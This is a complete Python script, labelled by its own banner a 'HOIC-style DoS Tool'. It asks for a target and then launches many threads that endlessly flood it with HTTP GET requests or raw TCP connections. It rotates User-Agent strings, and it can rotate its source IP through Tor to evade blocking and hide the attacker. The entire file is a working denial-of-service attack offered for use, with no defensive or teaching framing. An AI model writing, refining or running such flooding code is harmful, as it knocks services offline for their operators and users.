import threading
import requests
import socket
import time
import random
from stem import Signal
from stem.control import Controller

# ========== USER INPUT ==========
URL = input("Enter target URL or IP: ").strip()
MODE = input("Enter mode (HTTP/TCP): ").strip().upper()
TOR_PASSWORD = input("Enter Tor control password: ").strip()
PORT = 0
if MODE == "TCP":
    PORT = int(input("Enter port number: "))
THREADS = int(input("Enter number of threads: "))
IP_ROTATION_INTERVAL = int(input("Enter Tor IP rotation interval (seconds): "))
USE_TOR = input("Use Tor for IP rotation? (y/n): ").strip().lower() == 'y'
# =================================

def rotate_tor_ip():
    with Controller.from_port(port=9051) as controller:
        controller.authenticate(password=TOR_PASSWORD)
        while True:
            controller.signal(Signal.NEWNYM)
            print("[*] Tor IP rotated.")
            time.sleep(IP_ROTATION_INTERVAL)

def http_flood():
    while True:
        try:
            headers = {
                'User-Agent': random.choice(user_agents),
                'Cache-Control': 'no-cache'
            }
            r = requests.get(URL, headers=headers, timeout=5)
            print(f"[HTTP] Status: {r.status_code}")
        except Exception as e:
            print(f"[HTTP] Error: {e}")

def tcp_flood():
    ip = socket.gethostbyname(URL.replace("http://", "").replace("https://", ""))
    while True:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            sock.connect((ip, PORT))
            payload = b"GET / HTTP/1.1\r\nHost: " + bytes(ip, 'utf-8') + b"\r\n\r\n"
            sock.sendall(payload)
            sock.close()
            print(f"[TCP] Packet sent to {ip}:{PORT}")
        except Exception as e:
            print(f"[TCP] Error: {e}")

user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
    "Mozilla/5.0 (X11; Linux x86_64)",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_2 like Mac OS X)"
]

if __name__ == '__main__':
    print("[+] Starting HOIC-style DoS Tool")
    if USE_TOR:
        threading.Thread(target=rotate_tor_ip, daemon=True).start()

    for _ in range(THREADS):
        if MODE == "HTTP":
            threading.Thread(target=http_flood).start()
        elif MODE == "TCP":
            threading.Thread(target=tcp_flood).start()
        else:
            print("[!] Invalid mode. Choose 'HTTP' or 'TCP'")
            break
